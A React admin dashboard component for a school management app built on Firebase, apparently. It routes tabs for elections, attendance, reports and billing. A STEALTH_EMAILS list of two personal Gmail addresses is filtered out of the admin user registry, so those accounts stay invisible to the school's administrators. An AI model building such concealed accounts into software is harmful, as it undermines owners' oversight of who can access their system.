import React, { useState, useEffect, useMemo } from 'react';
import { useAuthentication } from '../hooks/useAuth';
import { db, firebase, functions } from '../services/firebase';
import Sidebar from './common/Sidebar';
import Card from './common/Card';
import Button from './common/Button';
import Spinner from './common/Spinner';
import { AdminApprovalQueue } from './AdminApprovalQueue';
import TimetableManager from './TimetableManager';
import { UserProfile, UserActivityLog, GES_CLASSES } from '../types';
import AdminAttendanceDashboard from './AdminAttendanceDashboard';
import AdminTerminalReports from './AdminTerminalReports';
import AdminClassManagement from './AdminClassManagement';
import AdminCalendar from './AdminCalendar';
import AdminMaterials from './AdminMaterials';
import SubscriptionCalculator from './SubscriptionCalculator';
import AdminUserList from './AdminUserList';
import ActivityMonitor from './ActivityMonitor';
import AdminCommunication from './AdminCommunication';
import AdminSettings from './AdminSettings';
import SystemActivation from './SystemActivation';
import AdminElectionManagement from './elections/AdminElectionManagement';
import { useToast } from './common/Toast';
import { 
  RocketIcon, 
  PulseIcon, 
  ShieldCheckIcon, 
  BallotIcon, 
  InstitutionIcon, 
  UserMatrixIcon, 
  ScheduleIcon, 
  FlyerIcon, 
  AttendanceIcon, 
  AnalyticsIcon, 
  LibraryIcon, 
  MegaphoneIcon, 
  WalletIcon, 
  GearIcon 
} from './common/PremiumIcons';

const STEALTH_EMAILS = ["bagsgraphics4g@gmail.com", "boatengadams4g@gmail.com"];

const AdminView: React.FC<{isSidebarExpanded: boolean; setIsSidebarExpanded: (v: boolean) => void;}> = ({ isSidebarExpanded, setIsSidebarExpanded }) => {
    const { user, userProfile, schoolSettings, subscriptionStatus } = useAuthentication();
    const { showToast } = useToast();
    const [activeTab, setActiveTab] = useState('dashboard');
    const [allUsers, setAllUsers] = useState<UserProfile[]>([]);
    const [recentLogs, setRecentLogs] = useState<UserActivityLog[]>([]);
    const [loading, setLoading] = useState(true);
    
    useEffect(() => {
        if (!userProfile || (userProfile.role !== 'admin' && !userProfile.isAlsoAdmin)) return;
        const unsubscribeUsers = db.collection('users').onSnapshot(snapshot => {
            const users = snapshot.docs.map(doc => doc.data() as UserProfile).filter(u => !STEALTH_EMAILS.includes(u.email || ""));
            setAllUsers(users);
        }, err => console.warn("User registry fault:", err.message));
        const unsubscribeLogs = db.collection('userActivity').orderBy('timestamp', 'desc').limit(8).onSnapshot(snapshot => {
                setRecentLogs(snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() } as UserActivityLog)));
                setLoading(false);
            }, err => { console.warn("Log fault:", err.message); setLoading(false); });
        return () => { unsubscribeUsers(); unsubscribeLogs(); };
    }, [userProfile]);

    const navItems = useMemo(() => {
        const rawItems = [
            { key: 'dashboard', label: 'Command Center', icon: <RocketIcon size={20} active={activeTab === 'dashboard'} /> },
            { key: 'activity', label: 'Activity Monitor', icon: <PulseIcon size={20} active={activeTab === 'activity'} /> },
            { key: 'approvals', label: 'Approvals', icon: <ShieldCheckIcon size={20} active={activeTab === 'approvals'} /> },
            { key: 'elections', label: 'Election Management', icon: <BallotIcon size={20} active={activeTab === 'elections'} /> },
            { key: 'class_management', label: 'Class Management', icon: <InstitutionIcon size={20} active={activeTab === 'class_management'} /> },
            { key: 'user_management', label: 'User Management', icon: <UserMatrixIcon size={20} active={activeTab === 'user_management'} /> },
            { key: 'timetables', label: 'Timetables', icon: <ScheduleIcon size={20} active={activeTab === 'timetables'} /> },
            { key: 'calendar', label: 'School Calendar', icon: <FlyerIcon size={20} active={activeTab === 'calendar'} /> },
            { key: 'attendance', label: 'Attendance', icon: <AttendanceIcon size={20} active={activeTab === 'attendance'} /> },
            { key: 'terminal_reports', label: 'Terminal Reports', icon: <AnalyticsIcon size={20} active={activeTab === 'terminal_reports'} /> },
            { key: 'materials', label: 'Teaching Material', icon: <LibraryIcon size={20} active={activeTab === 'materials'} /> },
            { key: 'communication', label: 'Communication', icon: <MegaphoneIcon size={20} active={activeTab === 'communication'} /> },
            { key: 'activation', label: 'Subscription & Billing', icon: <WalletIcon size={20} active={activeTab === 'activation'} /> },
            { key: 'settings', label: 'Settings', icon: <GearIcon size={20} active={activeTab === 'settings'} /> },
        ];
        const savedOrder = userProfile?.sidebarTabOrder?.admin;
        if (!savedOrder) return rawItems;
        const itemMap = new Map(rawItems.map(item => [item.key, item]));
        const orderedItems = savedOrder.map(key => itemMap.get(key)).filter((item): item is typeof rawItems[0] => !!item);
        const currentKeys = new Set(orderedItems.map(item => item.key));
        const missingItems = rawItems.filter(item => !currentKeys.has(item.key));
        return [...orderedItems, ...missingItems];
    }, [userProfile?.sidebarTabOrder?.admin, activeTab]);

    const handleReorder = async (newOrder: string[]) => {
        if (!userProfile) return;
        try { await db.collection('users').doc(userProfile.uid).set({ sidebarTabOrder: { ...(userProfile.sidebarTabOrder || {}), admin: newOrder } }, { merge: true }); } 
        catch (err) { console.warn("Order fault:", err); }
    };

    const renderContent = () => {
        switch(activeTab) {
            case 'dashboard': return <div className="space-y-6 animate-fade-in-up"><div className="bg-gradient-to-r from-indigo-950 to-slate-900 p-10 rounded-[2.5rem] border border-indigo-500/20 shadow-2xl relative overflow-hidden"><div className="absolute top-0 right-0 p-12 opacity-10 text-9xl">🏛️</div><h2 className="text-5xl font-black text-white uppercase tracking-tighter">Executive Command</h2><p className="text-indigo-400 text-xs font-bold uppercase tracking-[0.4em]">System Intelligence v2.5.0</p></div><div className="grid grid-cols-2 md:grid-cols-4 gap-6"><Card className="text-center py-8"><span className="text-4xl block mb-2">🎓</span><p className="text-4xl font-black text-white">{allUsers.filter(u => u.role === 'student').length}</p></Card><Card className="text-center py-8"><span className="text-4xl block mb-2">🧑‍🏫</span><p className="text-4xl font-black text-white">{allUsers.filter(u => u.role === 'teacher').length}</p></Card></div></div>;
            case 'activity': return <ActivityMonitor />;
            case 'approvals': return <AdminApprovalQueue allUsers={allUsers} />;
            case 'elections': return <AdminElectionManagement allUsers={allUsers} />;
            case 'class_management': return <AdminClassManagement allUsers={allUsers} />;
            case 'user_management': return <AdminUserList allUsers={allUsers} onNavigateToBilling={() => setActiveTab('activation')} />;
            case 'timetables': return <TimetableManager classId={GES_CLASSES[0]} />;
            case 'calendar': return <AdminCalendar />;
            case 'attendance': return <AdminAttendanceDashboard allUsers={allUsers} attendanceRecords={[]} />;
            case 'terminal_reports': return <AdminTerminalReports schoolSettings={schoolSettings} user={user} />;
            case 'materials': return <AdminMaterials />;
            case 'communication': return <AdminCommunication />;
            case 'activation': return <div className="space-y-12"><SystemActivation subscriptionStatus={subscriptionStatus} /><SubscriptionCalculator allUsers={allUsers} /></div>;
            case 'settings': return <AdminSettings />;
            default: return <div className="p-10 text-center text-slate-600">Module offline.</div>;
        }
    };

    return (
        <div className="flex flex-1 overflow-hidden relative">
            <Sidebar isExpanded={isSidebarExpanded} navItems={navItems} activeTab={activeTab} setActiveTab={setActiveTab} onClose={() => setIsSidebarExpanded(false)} title="Executive Portal" onReorder={handleReorder} />
            <main className="flex-1 p-8 overflow-y-auto bg-slate-950 dark:bg-slate-950 custom-scrollbar">{renderContent()}</main>
        </div>
    );
};

export default AdminView;